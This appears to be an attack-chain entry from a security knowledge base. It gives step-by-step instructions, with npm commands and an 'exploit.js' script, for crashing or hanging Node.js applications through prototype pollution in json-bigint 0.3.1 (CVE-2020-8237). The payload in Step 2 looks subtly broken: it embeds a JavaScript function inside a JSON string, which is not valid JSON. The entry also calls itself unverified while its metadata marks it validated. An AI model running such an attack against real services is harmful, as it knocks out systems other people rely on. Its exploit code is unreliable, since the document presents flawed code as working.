---
tags:
  - dos
  - prototype-pollution
  - node-js
  - json-bigint
  - cve-2020-8237
type: attack_chain
tools: []
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Node.js
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Import-Vulnerable-json-bigint-Module]]'
  - '[[procedures/Craft-and-Parse-Malicious-JSON-for-DoS]]'
step_count: 2
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:30.311Z'
description: >-
  A multi-step attack exploiting a prototype pollution vulnerability in the
  json-bigint Node.js module (v0.3.1) to cause denial of service through
  infinite loops or out-of-memory conditions by polluting the bignumber.js
  prototype during JSON parsing.
skill_level: intermediate
impact_level: high
id: 5318f2f2-aeda-4ef7-b812-3f807ed56be4
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# DoS via __proto__ Prototype Pollution in json-bigint Node.js Module

Multi-stage attack chain demonstrating a complete attack workflow exploiting CVE-2020-8237 in the json-bigint module to achieve denial of service in Node.js applications handling untrusted JSON input.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Import Vulnerable Module] --> B[Parse Malicious JSON]
    B --> C[Trigger DoS in bignumber.js Operations]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#e74c3c
```

## Prerequisites & Requirements

### Required Tools

- Node.js environment with npm

### Target Environment

- Node.js application using json-bigint v0.3.1
- Access to untrusted JSON input parsing

### Initial Access Requirements

- Ability to inject or provide malicious JSON input to the application
- No special credentials needed; exploits parsing logic

## Detailed Attack Procedures

### Step 1: Import Vulnerable Module
procedure: [[procedures/Import-Vulnerable-json-bigint-Module]]

**Objective**: Load the vulnerable json-bigint module in a Node.js script to set up the environment for exploitation.

**Instructions**: Create a Node.js script and import the module using require. Ensure json-bigint v0.3.1 is installed via npm.

First, install the vulnerable version:

```bash
npm install json-bigint@0.3.1
```

Then, in your script (e.g., exploit.js), import it:

```javascript
const JSONbig = require('json-bigint');
console.log('Module loaded successfully.');
```

Run the script to verify:

```bash
node exploit.js
```

**Expected Output**: Console log confirming module import without errors.

**Success Indicators**:
- Module imports without version conflicts
- No immediate errors on require

### Step 2: Craft and Parse Malicious JSON
procedure: [[procedures/Craft-and-Parse-Malicious-JSON-for-DoS]]

**Objective**: Construct a small malicious JSON payload (~70 bytes) that assigns a polluting value to __proto__, parse it with json-bigint, and trigger DoS in subsequent bignumber.js operations like stringification or arithmetic.

**Instructions**: Extend the script from Step 1. Craft a payload that sets a recursive or infinite-loop-inducing function on Object.prototype via __proto__, which affects bignumber.js internals.

Example payload (approximately 70 bytes):

```javascript
const maliciousJSON = '{"__proto__":{"toString":function(){while(true){};return \"\";}}}';
const parsed = JSONbig.parse(maliciousJSON);
// Now perform an operation that uses bignumber.js, e.g., new BigNumber(1).toString()
const BigNumber = require('bignumber.js');
const bn = new BigNumber('1');
console.log(bn.toString()); // This will hang or OOM due to polluted prototype
```

Run the extended script:

```bash
node exploit.js
```

**Expected Output**: The script hangs indefinitely, consumes excessive memory, or crashes the Node.js process.

**Success Indicators**:
- Parsing succeeds but subsequent bignumber.js operations fail with infinite loop or OOM
- Application becomes unresponsive to further requests

## Attack Chain Summary

### Key Achievements

1. Successfully imported vulnerable module without detection
2. Parsed malicious JSON to pollute prototypes
3. Achieved high-impact DoS with minimal payload size

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Endpoint Denial of Service]]

### MITRE ATT&CK Tactics

- [[Impact]]

---
*Last updated: 2023-10-01T00:00:00Z*
